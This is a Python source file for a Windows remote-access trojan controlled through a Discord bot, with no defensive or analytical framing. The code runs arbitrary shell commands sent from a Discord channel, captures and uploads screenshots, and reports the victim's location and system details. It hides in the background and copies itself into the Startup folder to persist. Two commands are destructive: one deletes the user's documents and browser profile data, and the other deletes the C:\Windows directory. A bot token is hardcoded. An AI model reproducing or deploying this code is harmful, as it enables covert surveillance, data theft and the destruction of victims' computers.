import os
import subprocess
import platform
import ctypes
import discord
from discord.ext import commands
from PIL import ImageGrab
import asyncio
import requests
import getpass
import sys
import shutil

# Configuration
TOKEN = "MTMyOTI0ODc2MDczOTQwMTc2OQ.GPJhEA.QWGMX3YBKxTEKVtNLuYdRCOiMY6vdWThLnexgE"  # Replace with your bot token
COMMAND_CHANNEL_ID = 1329249832732327999  # Replace with your channel ID
PREFIX = "!"

# Initialize bot with intents
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Check admin privileges
def check_admin_privileges():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# Send screenshot to Discord
async def send_screenshot_to_discord(file_path):
    try:
        channel = discord.utils.get(bot.get_all_channels(), id=COMMAND_CHANNEL_ID)
        if channel:
            await channel.send(file=discord.File(file_path))
        else:
            print("Channel not found.")
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

# Execute commands
async def execute_command(command):
    if command == 'cd ..':
        os.chdir('..')
        return f"Changed current directory to: {os.getcwd()}"
    elif command == 'location':
        return await get_location()
    elif command == 'info':
        return await get_system_info()
    elif command == 'screenshot':
        return await take_screenshot()
    elif command == 'dracarys':
        return dracarys()
    elif command == 'angos':
        return angos()
    elif command == 'help':
        return '''
        HELP MENU:
        !dracarys            | Obliterate the system (requires admin privileges)
        !angos               | Burn sensitive files to ashes
        !location            | Get the system's location info (IP, Country, City, etc.)
        !info                | Get detailed system info
        !screenshot          | Take a screenshot and send to Discord
        '''
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result.strip()
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.strip()}"

# Fetch geolocation
async def get_location():
    try:
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()
        url = f'http://ip-api.com/json/{public_ip}'
        response = requests.get(url)
        data = response.json()
        country = data.get('country')
        region = data.get('region')
        city = data.get('city')
        lat = data.get('lat')
        lon = data.get('lon')
        timezone = data.get('timezone')
        isp = data.get('isp')
        final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
        return final
    except Exception as e:
        return 'Could not retrieve location.'

# Fetch system information
async def get_system_info():
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': getpass.getuser(),
    }
    info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    return info_string

# Take screenshot
async def take_screenshot():
    file_path = "screenshot.png"
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(file_path)
        await send_screenshot_to_discord(file_path)
        os.remove(file_path)
        return "Screenshot sent to Discord."
    except Exception as e:
        return f"Error taking screenshot: {e}"

# Destructive command: Delete sensitive files
def angos():
    if not check_admin_privileges():
        return "Angos requires admin privileges!"
    username = os.getenv("USERNAME")
    critical_paths = [
        f"C:\\Users\\{username}\\Documents\\*",
        f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\*",
        "C:\\Windows\\Temp\\*.*"
    ]
    try:
        for path in critical_paths:
            if '*' in path:
                dir_path = os.path.dirname(path)
                subprocess.run(f'del /f /s /q "{dir_path}"', shell=True, check=True)
            else:
                if os.path.exists(path):
                    if os.path.isfile(path):
                        os.remove(path)
                    else:
                        subprocess.run(f'rd /s /q "{path}"', shell=True, check=True)
        return "Angos has burned sensitive files to ashes."
    except Exception as e:
        return f"Failed to unleash Angos: {str(e)}"

# Destructive command: Full system destruction
def dracarys():
    if not check_admin_privileges():
        return "Dracarys requires admin privileges!"
    try:
        subprocess.run("rd /s /q C:\\Windows", shell=True, check=True)
        return "Dracarys has unleashed its full fury and destroyed the system."
    except Exception as e:
        return f"Failed to unleash Dracarys: {str(e)}"

# Run the script in the background
def run_in_background():
    if platform.system() == "Windows":
        # Detach the script from the terminal and run in the background
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen(
            [sys.executable, os.path.abspath(__file__)],
            creationflags=DETACHED_PROCESS,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        sys.exit(0)  # Exit the original process

# Ensure persistence after reboot
def ensure_persistence():
    if platform.system() == "Windows":
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        current_script = os.path.abspath(__file__)
        target_script = os.path.join(startup_folder, os.path.basename(current_script))
        if not os.path.exists(target_script):
            shutil.copy(current_script, target_script)

# Handle incoming messages
@bot.event
async def on_message(message):
    if message.channel.id == COMMAND_CHANNEL_ID:
        if message.content.startswith(PREFIX):
            command = message.content[len(PREFIX):]
            result = await execute_command(command)
            await message.channel.send(result)
    await bot.process_commands(message)

# Main entry point
if __name__ == "__main__":
    if platform.system() != "Windows":
        exit("This script is designed to run only on Windows systems.")

    # Ensure the script runs in the background
    run_in_background()

    # Ensure persistence after reboot
    ensure_persistence()

    # Start the bot
    bot.run(TOKEN)
